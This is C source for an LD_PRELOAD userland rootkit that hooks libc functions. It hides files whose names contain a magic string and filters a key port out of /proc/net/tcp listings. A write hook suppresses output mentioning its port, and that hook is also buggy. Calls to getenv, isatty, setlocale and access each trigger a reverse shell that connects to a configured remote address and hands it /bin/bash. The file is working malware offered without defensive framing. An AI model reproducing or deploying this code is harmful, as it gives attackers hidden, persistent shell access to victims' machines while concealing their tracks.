#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <netinet/in.h>
#include <locale.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include "rootkit.h"

static char* (*old_getenv)(const char *name);
static int (*old_isatty)(int fd);
static char* (*old_setlocale)(int category, const char *locale);
static int (*old_access)(const char *pathname, int mode);
static struct dirent* (*old_readdir)(DIR *dir);
static struct dirent64* (*old_readdir64)(DIR *dir);
static FILE* (*old_fopen)(const char *pathname, const char *mode);
static FILE* (*old_fopen64)(const char *pathname, const char *mode);
//static ssize_t (*old_recvmsg)(int socket, struct msghdr *message, int flags);
static ssize_t (*old_write)(int fd, const void *buf, size_t count);


void IPv4() {
    int sockfd;
    pid_t pid;
    struct sockaddr_in server, client;

    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
        inet_pton(AF_INET, REMOTE_ADDR_4, &server.sin_addr);
        server.sin_port = htons(REMOTE_PORT);
        server.sin_family = AF_INET;

        client.sin_addr.s_addr = INADDR_ANY;
        client.sin_port = htons(LOCAL_PORT);
        client.sin_family = AF_INET;

        if ((bind(sockfd, (struct sockaddr *)&client, sizeof(client)) != -1) &&
        (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) != -1)) {
            pid = fork();
            if(pid == 0) {
                for(int i = 0; i < 3; i++) dup2(sockfd, i);
                execve("/bin/bash", NULL, NULL);
            }
            else close(sockfd);
        }
    }
}


struct dirent* readdir(DIR* dir) {
    struct dirent *dir_;

    if(old_readdir == NULL) old_readdir = dlsym(RTLD_NEXT, "readdir");
    while(dir_ = old_readdir(dir)) {
        if(strstr(dir_->d_name, MAGIC_STRING) == NULL) break;
    }
    return dir_;
}


struct dirent64* readdir64(DIR* dir) {
    struct dirent64 *dir_;

    if(old_readdir64 == NULL) old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    while(dir_ = old_readdir64(dir)) {
        if(strstr(dir_->d_name, MAGIC_STRING) == NULL) break;
    }
    return dir_;
}


FILE* fopen(const char *pathname, const char *mode) {
    if(old_fopen == NULL) old_fopen = dlsym(RTLD_NEXT, "fopen64");
    if(strcmp(pathname, PROC_NET_TCP) == 0 || strcmp(pathname, PROC_NET_TCP6) == 0) {
        FILE *tmp = tmpfile(), *old_file;
        char *buff = NULL;
        size_t buff_length = 0;

        if((old_file = old_fopen(pathname, mode)) != NULL) {
            while(getline(&buff, &buff_length, old_file) != -1) {
                if(strstr(buff, KEY_PORT) == NULL)
                    fputs(buff, tmp);
            }
            fclose(old_file);
            free(buff);
            buff = NULL;
            rewind(tmp);

            return tmp;
        }
        if(tmp != NULL) fclose(tmp);
    }
    return old_fopen(pathname, mode);
}


FILE* fopen64(const char *pathname, const char *mode) {
    if(old_fopen64 == NULL) old_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    if(strcmp(pathname, PROC_NET_TCP) == 0 || strcmp(pathname, PROC_NET_TCP6) == 0) {
        FILE *tmp = tmpfile64(), *old_file;
        char *buff = NULL;
        size_t buff_length = 0;

        if((old_file = old_fopen64(pathname, mode)) != NULL) {
            while(getline(&buff, &buff_length, old_file) != -1) { 
                if(strstr(buff, KEY_PORT) == NULL)
                    fputs(buff, tmp);
            }
            fclose(old_file);
            free(buff);
            buff = NULL;
            rewind(tmp);

            return tmp;
        }
        if(tmp != NULL) fclose(tmp);
    }
    return old_fopen64(pathname, mode);
}


/*ssize_t recvmsg(int socket, struct msghdr *message, int flags) {
    struct nlmsghdr *netlink_header;
    struct inet_diag_msg *idiag_message;
    int tmp_recvmsg;

    if(old_recvmsg == NULL) old_recvmsg = dlsym(RTLD_NEXT, "recvmsg");
    if(tmp_recvmsg = old_recvmsg(socket, message, flags) < 0) return tmp_recvmsg;
    netlink_header = (struct nlmsghdr *)message->msg_iov->iov_base;

    while(NLMSG_OK(netlink_header, tmp_recvmsg)) {
        idiag_message = NLMSG_DATA(netlink_header);
        printf("%u\n", (unsigned int)ntohs(idiag_message->id.idiag_sport));

        netlink_header = NLMSG_NEXT(netlink_header, tmp_recvmsg);
        continue;
    }

    return tmp_recvmsg;
}*/


ssize_t write(int fd, const void *buf, size_t count) {
    if(old_write == NULL) old_write = dlsym(RTLD_NEXT, "write");

    if(!strstr((char *)buf, (char *)LOCAL_PORT)) return old_write(fd, buf, count);
}


char* getenv(const char *name) {
    if(old_getenv == NULL) old_getenv = dlsym(RTLD_NEXT, "getenv");
    IPv4();
    
    return old_getenv(name);
}


int isatty(int fd) {
    if(old_isatty == NULL) old_isatty = dlsym(RTLD_NEXT, "isatty");
    IPv4();

    return old_isatty(fd);
}


char* setlocale(int category, const char *locale) {
    if(old_setlocale == NULL) old_setlocale = dlsym(RTLD_NEXT, "setlocale");
    IPv4();

    return old_setlocale(category, locale);
}


int access(const char *pathname, int mode) {
    if(old_access == NULL) old_access = dlsym(RTLD_NEXT, "access");
    IPv4();

    return old_access(pathname, mode);
}
